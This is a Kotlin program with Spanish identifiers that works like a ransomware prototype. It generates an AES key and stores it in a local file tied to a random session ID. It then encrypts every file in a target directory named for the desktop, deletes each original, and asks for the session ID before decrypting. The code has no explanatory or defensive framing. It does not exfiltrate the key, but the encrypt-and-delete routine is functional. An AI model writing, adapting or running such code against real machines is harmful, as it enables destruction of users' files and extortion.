package happyIdPack

import java.io.File
import java.security.Key
import javax.crypto.Cipher
import javax.crypto.KeyGenerator
import javax.crypto.spec.SecretKeySpec
import java.util.Base64
import java.util.UUID

fun main() {
    val directorioEscritorio = ""

    val clave = generarClaveSimetrica()

    val idSesion = UUID.randomUUID().toString()

    guardarClaveEnArchivo(clave, idSesion)
    println("$idSesion")

    val archivos = File(directorioEscritorio).listFiles()
    archivos?.forEach { archivo ->
        if (archivo.isFile && !archivo.name.endsWith(".enc")) {
            println("Cifrando archivo: ${archivo.name}")
            cifrarArchivo(archivo, clave)
            archivo.delete()
        }
    }

    println("Introduce el ID de la sesión para desencriptar los archivos:")
    val idSesionEntrada = readLine()?.trim()

    if (idSesionEntrada != null) {
        val claveRecuperada = recuperarClaveDesdeArchivo(idSesionEntrada)
        if (claveRecuperada != null) {
            val archivosCifrados = File(directorioEscritorio).listFiles()
            archivosCifrados?.forEach { archivo ->
                if (archivo.isFile && archivo.name.endsWith(".enc")) {
                    descifrarArchivo(archivo, claveRecuperada)
                    archivo.delete()
                }
            }
            println("Archivos descifrados con éxito.")
        } else {
            println("No se encontró la clave para este ID. Los archivos no se han descifrado.")
        }
    } else {
        println("ID de sesión no válido. Los archivos no se han descifrado.")
    }
}

fun generarClaveSimetrica(): Key {
    val keyGen = KeyGenerator.getInstance("AES")
    keyGen.init(128) // Tamaño de la clave: 128 bits
    return keyGen.generateKey()
}

fun cifrarArchivo(archivo: File, clave: Key) {
    val cipher = Cipher.getInstance("AES")
    cipher.init(Cipher.ENCRYPT_MODE, clave)

    val bytes = archivo.readBytes()
    val resultado = cipher.doFinal(bytes)

    val archivoCifrado = File("${archivo.absolutePath}.enc")
    archivoCifrado.writeBytes(resultado)

    println("Archivo cifrado: ${archivoCifrado.name}")
}

fun descifrarArchivo(archivo: File, clave: Key) {
    val cipher = Cipher.getInstance("AES")
    cipher.init(Cipher.DECRYPT_MODE, clave)

    val bytes = archivo.readBytes()
    val resultado = cipher.doFinal(bytes)

    val archivoDescifrado = File(archivo.absolutePath.removeSuffix(".enc"))
    archivoDescifrado.writeBytes(resultado)

    println("Archivo descifrado: ${archivoDescifrado.name}")
}

fun convertirClaveDesdeBase64(base64: String): Key {
    val bytes = Base64.getDecoder().decode(base64)
    return SecretKeySpec(bytes, "AES")
}

fun guardarClaveEnArchivo(clave: Key, idSesion: String) {
    val claveBase64 = Base64.getEncoder().encodeToString(clave.encoded)
    val archivoClave = File("clave_$idSesion.txt")
    archivoClave.writeText(claveBase64)
    println("Clave guardada con ID de sesión: $idSesion")
}

fun recuperarClaveDesdeArchivo(idSesion: String): Key? {
    val archivoClave = File("clave_$idSesion.txt")
    if (archivoClave.exists()) {
        val claveBase64 = archivoClave.readText()
        return convertirClaveDesdeBase64(claveBase64)
    }
    return null
}
